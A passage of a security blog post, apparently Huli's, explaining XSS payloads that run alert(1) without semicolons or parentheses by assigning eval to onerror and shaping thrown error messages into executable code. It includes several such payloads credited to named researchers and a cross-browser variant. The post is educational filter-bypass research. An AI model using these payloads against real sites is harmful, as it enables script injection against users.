+<span class="token keyword">throw</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">lineNumber</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">columnNumber</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">fileName</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token literal-property property">message</span><span class="token operator">:</span><span class="token string">'alert\x281\x29'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>In summary, all of these efforts are to control the final error message produced by Firefox. As long as you can control it, you can construct valid code to pass to eval for execution.</p>
+<p>Recently, I saw Gareth Heyes <a target="_blank" rel="noopener" href="https://x.com/garethheyes/status/1961078705293246513">tweet</a> that Firefox is going to remove this feature: <a target="_blank" rel="noopener" href="https://github.com/PortSwigger/xss-cheatsheet-data/issues/103">Firefox removed support for throwing error-like objects</a>, so he found a new method:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span> onerror<span class="token operator">=</span>eval<span class="token punctuation">,</span>x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">,</span>x<span class="token punctuation">.</span>message<span class="token operator">=</span><span class="token string">'alert\x281\x29'</span><span class="token punctuation">,</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>It seems that if you want to create a new Error, you can do it without parentheses. After creating an Error object, you can set the message, and you can still control the error message.</p>
+<h2><span id="other-payloads">Other payloads</span></h2><p>There are other payloads mentioned by others in the original post.</p>
+<p>The first one comes from <a target="_blank" rel="noopener" href="https://x.com/terjanq/status/1128692453047975936">@terjanq</a>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span><span class="token operator">/</span>a<span class="token operator">/</span><span class="token punctuation">,</span>Uncaught<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>g<span class="token operator">=</span>alert<span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token constant">URL</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">,</span><span class="token operator">/</span><span class="token number">1</span><span class="token operator">/</span>g<span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">1337</span><span class="token punctuation">,</span><span class="token number">3331</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>I tried this payload, and it currently only works in Chrome. It can clearly be broken down into several parts:</p>
+<ol>
+<li><code>/a/</code></li>
+<li><code>Uncaught=1</code></li>
+<li><code>g=alert</code></li>
+<li><code>a=URL+0</code></li>
+<li><code>onerror=eval</code></li>
+<li><code>throw /1/g+a[12]+[1337,3331,117]+a[13]</code></li>
+</ol>
+<p>Because it is connected by commas, the part that gets thrown will be the last segment.</p>
+<p>Let’s start with the last segment. What does <code>throw /1/g+a[12]+[1337,3331,117]+a[13]</code> do?</p>
+<p>First, <code>a</code> is <code>URL+0</code>, and <code>URL</code> is a global function. The function + 0 will become a string, so <code>a</code> is <code>&quot;function URL() &#123; [native code] &#125;0&quot;</code>, thus <code>a[12]</code> and <code>a[13]</code> are <code>(</code> and <code>)</code> respectively.</p>
+<p>The <code>/1/g</code> is a regexp, and when it becomes a string, it will be <code>&quot;/1/g&quot;</code>. As for the array <code>[1337,3331,117]</code>, when converted to a string, it will call <code>join</code>, resulting in <code>&quot;1337,3331,117&quot;</code>.</p>
+<p>Putting it all together, <code>/1/g+a[12]+[1337,3331,117]+a[13]</code> will be <code>/1/g(1337,3331,117)</code>.</p>
+<p>Combined with what was mentioned earlier, the error message thrown will be:</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught &#x2F;1&#x2F;g(1337,3331,117)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Here, the <code>/</code> was previously treated as a regexp, but in the current code, it actually represents arithmetic division, i.e., <code>a / b / c</code>, where <code>a</code> is <code>Uncaught</code>, <code>b</code> is <code>1</code>, and <code>c</code> is <code>g(1337,3331,117)</code>.</p>
+<p>If <code>Uncaught</code> is not declared, it will throw an error, which is why <code>Uncaught=1</code> is needed. Then <code>g</code> will be treated as a function, so <code>g=alert</code>.</p>
+<p>What about the first line <code>/a/</code>? This is likely just to prevent a space between <code>throw</code> and the subsequent payload, and it doesn’t serve any other purpose.</p>
+<p>The essence of this solution lies in making the error message become <code>Uncaught /1/g(1337,3331,117)</code> when thrown, which is a valid piece of code. As long as some prerequisites are fulfilled, it can successfully call the function <code>g</code>.</p>
+<p>The second one comes from <a target="_blank" rel="noopener" href="https://x.com/cgvwzq">@cgvwzq</a>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>This is actually divided into two statements. The first statement is: <code>TypeError.prototype.name =&#39;=/&#39;</code>, which forcibly changes the name of <code>TypeError</code> to <code>=/</code>.</p>
+<p>Without this line, the error message for <code>0[0][&#39;test&#39;]</code> would be: <code>Uncaught TypeError: Cannot read properties of undefined (reading &#39;test&#39;)</code>.</p>
+<p><code>0[0]</code> will be undefined, and <code>undefined[&#39;test&#39;]</code> will throw this TypeError.</p>
+<p>After we forcibly change the name:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'hello!'</span><span class="token punctuation">;</span>
+<span class="token number">0</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment">// Uncaught hello!: Cannot read properties of undefined (reading 'test')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>We can control the original part of <code>TypeError</code> to become any string.</p>
+<p>The other statement <code>0[onerror=eval][&#39;/-alert(1)//&#39;]</code> simply places the assignment inside <code>[]</code>. After the assignment, it is equivalent to <code>0[eval]</code>, which will return undefined, thus throwing a TypeError.</p>
+<p>Let’s look at it another way, with the following code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'&#123;1&#125;'</span><span class="token punctuation">;</span>
+<span class="token number">0</span><span class="token punctuation">[</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'&#123;2&#125;'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>The error message generated in Chrome would be:</p>
+<pre class="line-numbers language-none"><code class="language-none">Uncaught &#123;1&#125;: can&#39;t access property &quot;&#123;2&#125;&quot;, 0[eval] is undefined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Now the problem becomes how to control the string above to make the error message a valid piece of code?</p>
+<p>In place of <code>&#123;1&#125;</code>, the author placed <code>=/</code>, resulting in <code>Uncaught=/</code>. This <code>/</code> actually means regexp, so the idea of this method is to make the string before <code>&#123;2&#125;</code> (<code>: can&#39;t access property &quot;</code> ) become part of the regexp.</p>
+<p>Thus, the beginning of <code>&#123;2&#125;</code> is <code>/</code>, forming a regexp with the preceding part, and then using <code>-alert(1)</code> to execute the function. It can also be changed to <code>+alert(1)</code>, as it just needs to string the two operations together. After execution, the subsequent code is all commented out with <code>//</code>, so it can be ignored.</p>
+<p>However, if you actually run the above payload, you will find that Chrome returns the error message: <code>Invalid regular expression ... Unterminated group</code>. This is because there is a <code>(</code> in the error message, which may not have been there, causing the regexp syntax to be incorrect. You just need to add a <code>)</code> to fix it:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">')/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>The generated error message will be:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Uncaught <span class="token operator">=</span><span class="token operator">/</span><span class="token operator">:</span> Cannot read properties <span class="token keyword">of</span> <span class="token keyword">undefined</span> <span class="token punctuation">(</span>reading <span class="token string">')/-alert(1)//'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>A simplified version would be:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Uncaught <span class="token operator">=</span><span class="token operator">/</span>regexp<span class="token operator">/</span><span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//...</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>By the way, this payload works fine on Chrome 139, but Firefox 142 will throw an error: <code>Uncaught SyntaxError: expected expression, got &#39;=&#39;</code>.</p>
+<p>If you want to debug, just change <code>onerror=eval</code> to <code>onerror=console.log</code> to see what the generated error message looks like:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x3D;&#x2F;: can&#39;t access property &quot;)&#x2F;&#x2F;alert(1)&#x2F;&#x2F;&quot;, 0[console.log] is undefined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>It seems that in Firefox, there is nothing in front of the TypeError’s name, so to make it work in Firefox, you can just add any character that can be a variable in front:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'a=/'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'/-alert(1)//'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>If you really understand this approach, you can actually insert code at the TypeName part by following this idea, resulting in the same outcome, but not that cool (it works fine on Chrome):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'=alert(1)//'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>As for how to construct a payload that works on both Chrome and Firefox, readers can practice on their own or refer to an example I created, which adds some variations:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>name <span class="token operator">=</span><span class="token string">'+/['</span><span class="token punctuation">,</span><span class="token punctuation">[</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">]</span><span class="token punctuation">[</span>window<span class="token punctuation">.</span>Uncaught<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">']/-alert\501\51&lt;!--'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2><span id="summary">Summary</span></h2><p>In fact, regardless of which payload it is, the core concept is the same: just turn the error message into valid JavaScript code and pass it to eval for execution.</p>
+<p>To understand the payload, you need to be somewhat familiar with JavaScript code, such as <code>0[onerror=eval]</code> or the use of commas; you should at least know what’s going on.</p>
+<p>Besides that, it’s about using your imagination, which is harder to practice and usually starts with observation and imitation.</p>
+<p>Finally, here are a few key points:</p>
+<ol>
+<li>Commas can chain multiple expressions, returning the last one.</li>
+<li>Replacing onerror with eval allows you to execute the error message as code.</li>
+<li>Errors thrown will become part of the error message.</li>
+<li>As long as you can turn the error message into valid code, you’ve succeeded.</li>
+</ol>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/JavaScript/">#JavaScript</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2025/04/23/en/everyone-need-a-http-proxy-to-debug/">Everyone Needs an HTTP Proxy for Debugging</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2025 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2025/09/15/xss-without-semicolon-and-parentheses/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
